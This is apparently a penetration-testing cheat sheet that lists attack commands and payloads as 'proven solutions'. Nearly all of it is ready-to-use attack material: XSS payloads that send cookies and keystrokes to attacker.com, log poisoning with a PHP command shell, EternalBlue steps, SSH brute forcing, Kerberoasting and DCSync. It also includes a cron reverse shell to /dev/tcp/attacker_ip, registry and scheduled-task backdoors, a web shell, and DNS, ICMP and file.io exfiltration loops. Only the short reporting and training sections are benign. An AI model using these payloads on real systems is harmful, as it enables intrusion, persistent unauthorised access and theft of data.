# Penetration Testing Solutions and Techniques

## Overview
This document contains proven solutions, techniques, and methodologies for common penetration testing scenarios encountered during security assessments.

## Web Application Penetration Testing Solutions

### SQL Injection Exploitation
**Problem**: Identifying and exploiting SQL injection vulnerabilities

**Solution**:
```bash
# 1. Manual testing for SQL injection
# Test with single quote
http://target.com/page.php?id=1'

# Test with boolean-based blind SQL injection
http://target.com/page.php?id=1' AND 1=1--
http://target.com/page.php?id=1' AND 1=2--

# 2. Automated testing with sqlmap
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# 3. POST parameter testing
sqlmap -u "http://target.com/login.php" --data="username=admin&password=admin" --dbs
```

**Advanced Techniques**:
- WAF bypass techniques
- Time-based blind SQL injection
- Second-order SQL injection
- NoSQL injection

### Cross-Site Scripting (XSS) Exploitation
**Problem**: Finding and exploiting XSS vulnerabilities

**Solution**:
```javascript
// 1. Basic XSS payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// 2. Cookie stealing payload
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// 3. Keylogger payload
<script>
document.onkeypress = function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://attacker.com/keylog.php', true);
    xhr.send('key=' + String.fromCharCode(e.which));
}
</script>

// 4. BeEF hook payload
<script src="http://attacker.com:3000/hook.js"></script>
```

### Local File Inclusion (LFI) Exploitation
**Problem**: Exploiting LFI vulnerabilities to read sensitive files

**Solution**:
```bash
# 1. Basic LFI testing
http://target.com/page.php?file=../../../etc/passwd
http://target.com/page.php?file=....//....//....//etc/passwd

# 2. Windows LFI
http://target.com/page.php?file=../../../windows/system32/drivers/etc/hosts

# 3. Log poisoning for RCE
# Poison Apache access logs
curl -A "<?php system($_GET['cmd']); ?>" http://target.com/
http://target.com/page.php?file=../../../var/log/apache2/access.log&cmd=whoami

# 4. PHP wrapper exploitation
http://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php
```

## Network Penetration Testing Solutions

### SMB Enumeration and Exploitation
**Problem**: Enumerating and exploiting SMB services

**Solution**:
```bash
# 1. SMB enumeration
nmap -p 445 --script smb-enum-shares,smb-enum-users target_ip
smbclient -L //target_ip -N
enum4linux target_ip

# 2. SMB null session
smbclient //target_ip/share -N
rpcclient -U "" target_ip

# 3. EternalBlue exploitation (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set LHOST attacker_ip
exploit

# 4. SMB relay attack
responder -I eth0 -wrf
ntlmrelayx.py -tf targets.txt -smb2support
```

### SSH Penetration Testing
**Problem**: Testing SSH services for vulnerabilities

**Solution**:
```bash
# 1. SSH enumeration
nmap -p 22 --script ssh-enum-algos,ssh-hostkey target_ip
ssh-audit target_ip

# 2. SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target_ip
medusa -h target_ip -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# 3. SSH key enumeration
ssh-keyscan target_ip
nmap -p 22 --script ssh-publickey-acceptance target_ip

# 4. SSH tunneling for pivoting
ssh -D 8080 user@target_ip
ssh -L 8080:internal_host:80 user@target_ip
ssh -R 8080:localhost:80 user@target_ip
```

### Active Directory Penetration Testing
**Problem**: Enumerating and exploiting Active Directory environments

**Solution**:
```bash
# 1. Domain enumeration
enum4linux target_ip
ldapsearch -x -h target_ip -s base namingcontexts
rpcclient -U "" target_ip

# 2. Kerberoasting
GetUserSPNs.py domain.com/user:password -dc-ip target_ip -request
hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt

# 3. ASREPRoasting
GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# 4. DCSync attack
secretsdump.py domain.com/user:password@target_ip
```

## Privilege Escalation Solutions

### Linux Privilege Escalation
**Problem**: Escalating privileges on Linux systems

**Solution**:
```bash
# 1. Enumeration scripts
./linpeas.sh
./linux-exploit-suggester.sh
./LinEnum.sh

# 2. SUID binary exploitation
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# 3. Sudo misconfiguration
sudo -l
# If sudo NOPASSWD for specific commands
sudo /vulnerable/command

# 4. Cron job exploitation
cat /etc/crontab
ls -la /etc/cron*
# Check for writable cron scripts

# 5. Kernel exploits
uname -a
searchsploit linux kernel 4.15
```

### Windows Privilege Escalation
**Problem**: Escalating privileges on Windows systems

**Solution**:
```powershell
# 1. Enumeration
whoami /priv
systeminfo
net user
net localgroup administrators

# 2. PowerShell enumeration
PowerUp.ps1
Invoke-AllChecks

# 3. Windows exploit suggester
systeminfo > systeminfo.txt
python windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.txt

# 4. Service exploitation
sc query
wmic service list brief

# 5. Registry exploitation
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated"
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated"
```

## Wireless Penetration Testing Solutions

### WPA/WPA2 Cracking
**Problem**: Cracking WPA/WPA2 wireless networks

**Solution**:
```bash
# 1. Monitor mode setup
airmon-ng start wlan0
iwconfig wlan0mon

# 2. Network discovery
airodump-ng wlan0mon

# 3. Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Deauthentication attack
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crack handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap

# 6. GPU acceleration with hashcat
cap2hccapx.bin capture.cap capture.hccapx
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt
```

## Post-Exploitation Solutions

### Persistence Mechanisms
**Problem**: Maintaining access to compromised systems

**Solution**:
```bash
# 1. Linux persistence
# Cron job backdoor
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" | crontab -

# SSH key persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3... attacker@kali" >> ~/.ssh/authorized_keys

# 2. Windows persistence
# Registry run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled task
schtasks /create /tn "backdoor" /tr "C:\backdoor.exe" /sc onlogon

# 3. Web shell persistence
# PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

### Data Exfiltration
**Problem**: Extracting sensitive data from compromised systems

**Solution**:
```bash
# 1. File compression and encryption
tar -czf data.tar.gz /sensitive/data/
gpg --cipher-algo AES256 --compress-algo 1 --symmetric data.tar.gz

# 2. Covert channels
# DNS exfiltration
for i in $(cat sensitive_data.txt | base64 | tr -d '\n' | sed 's/.{32}/&\n/g'); do dig $i.attacker.com; done

# ICMP exfiltration
xxd -p -c 16 sensitive_data.txt | while read line; do ping -c 1 -p $line attacker_ip; done

# 3. Cloud storage upload
curl -X POST -F "file=@sensitive_data.txt" https://file.io

# 4. Steganography
steghide embed -cf image.jpg -ef sensitive_data.txt
```

## Reporting and Documentation Solutions

### Vulnerability Classification
**Problem**: Properly classifying and rating vulnerabilities

**Solution**:
```
# CVSS v3.1 Scoring
Base Score = 8.8 (High)
Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

# Risk Rating Matrix
Impact: High
Likelihood: Medium
Overall Risk: High

# Remediation Priority
Critical: Fix immediately
High: Fix within 30 days
Medium: Fix within 90 days
Low: Fix within 180 days
```

## Continuous Learning and Improvement

### Practice Environments
- **VulnHub**: Vulnerable virtual machines
- **HackTheBox**: Online penetration testing platform
- **TryHackMe**: Beginner-friendly security challenges
- **OverTheWire**: Wargames and challenges
- **PentesterLab**: Web application security exercises

### Certification Paths
- **OSCP**: Offensive Security Certified Professional
- **CEH**: Certified Ethical Hacker
- **GPEN**: GIAC Penetration Tester
- **CISSP**: Certified Information Systems Security Professional
- **CISM**: Certified Information Security Manager
